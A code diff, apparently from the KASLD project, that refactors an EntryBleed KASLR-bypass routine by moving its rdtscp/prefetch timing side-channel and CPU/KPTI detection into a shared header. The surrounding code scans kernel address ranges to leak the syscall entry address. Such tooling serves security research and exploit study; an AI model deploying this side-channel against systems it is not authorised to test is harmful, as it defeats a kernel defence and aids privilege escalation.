@@ -52,9 +52,8 @@
 #define _GNU_SOURCE
 #include "include/kasld.h"
 #include "include/kasld_internal.h"
+#include "include/sidechannel.h"
 #include <errno.h>
-#include <stdbool.h>
-#include <stdint.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
@@ -288,74 +287,6 @@ int detect_kernel_version() {
   return -1;
 }
 
-bool detect_cpu_pti_flag() {
-  bool pti = false;
-  FILE *cpuinfo = fopen("/proc/cpuinfo", "rb");
-  char *line = 0;
-  size_t size = 0;
-  while (getline(&line, &size, cpuinfo) != -1) {
-    if (strstr(line, "flags") == NULL)
-      continue;
-    if (strstr(line, " pti") != NULL) {
-      pti = true;
-      break;
-    }
-  }
-  free(line);
-  fclose(cpuinfo);
-  return pti;
-}
-
-int detect_cpu_vendor() {
-  int cpu = 0;
-  FILE *cpuinfo = fopen("/proc/cpuinfo", "rb");
-  char *line = 0;
-  size_t size = 0;
-  while (getline(&line, &size, cpuinfo) != -1) {
-    if (strstr(line, "vendor") == NULL)
-      continue;
-
-    if (strstr(line, "AuthenticAMD") != NULL) {
-      cpu = 1;
-      break;
-    }
-    if (strstr(line, "Intel") != NULL) {
-      cpu = 2;
-      break;
-    }
-  }
-  free(line);
-  fclose(cpuinfo);
-  return cpu;
-}
-
-uint64_t sidechannel(uint64_t addr) {
-  uint64_t a, b, c, d;
-  // Note: clang does not support this asm with intel_syntax noprofix
-  __asm__ volatile(".intel_syntax noprefix;"
-                   "mfence;"
-                   "rdtscp;"
-                   "mov %0, rax;"
-                   "mov %1, rdx;"
-                   "xor rax, rax;"
-                   "lfence;"
-                   "prefetchnta qword ptr [%4];"
-                   "prefetcht2 qword ptr [%4];"
-                   "xor rax, rax;"
-                   "lfence;"
-                   "rdtscp;"
-                   "mov %2, rax;"
-                   "mov %3, rdx;"
-                   "mfence;"
-                   ".att_syntax;"
-                   : "=r"(a), "=r"(b), "=r"(c), "=r"(d)
-                   : "r"(addr)
-                   : "rax", "rbx", "rcx", "rdx");
-  a = (b << 32) | a;
-  c = (d << 32) | c;
-  return c - a;
-}
-
 #define STEP 0x100000ul
 #define ARR_SIZE (unsigned long)((KERNEL_BASE_MAX - KERNEL_BASE_MIN) / STEP)
 
@@ -372,7 +303,7 @@ uint64_t leak_syscall_entry(uint64_t offset) {
     for (idx = 0; idx < ARR_SIZE; idx++) {
       uint64_t test = SCAN_START + idx * STEP;
       syscall(104);
-      uint64_t time = sidechannel(test);
+      uint64_t time = time_prefetch(test);
       if (i >= dummy_iterations)
         data[idx] += time;
     }
@@ -397,17 +328,18 @@ uint64_t leak_syscall_entry(uint64_t offset) {
 unsigned long get_kernel_addr_entrybleed() {
   int cpu = detect_cpu_vendor();
 
-  if (cpu == 0) {
+  if (cpu == CPU_VENDOR_UNKNOWN) {
     fprintf(stderr, "[-] Unknown CPU vendor\n");
     return 0;
   }
 
-  int pti = detect_cpu_pti_flag();
+  bool pti = detect_kpti();
 
-  printf("[.] %s CPU with KPTI %s\n", (cpu == 1 ? "AMD" : "Intel"),
+  printf("[.] %s CPU with KPTI %s\n",
+         (cpu == CPU_VENDOR_AMD ? "AMD" : "Intel"),
          (pti ? "enabled" : "disabled"));
 
-  if (cpu == 1 && pti == 1) {
+  if (cpu == CPU_VENDOR_AMD && pti) {
     fprintf(
         stderr,
         "[-] AMD systems with KPTI enabled are not affected by EntryBleed\n");
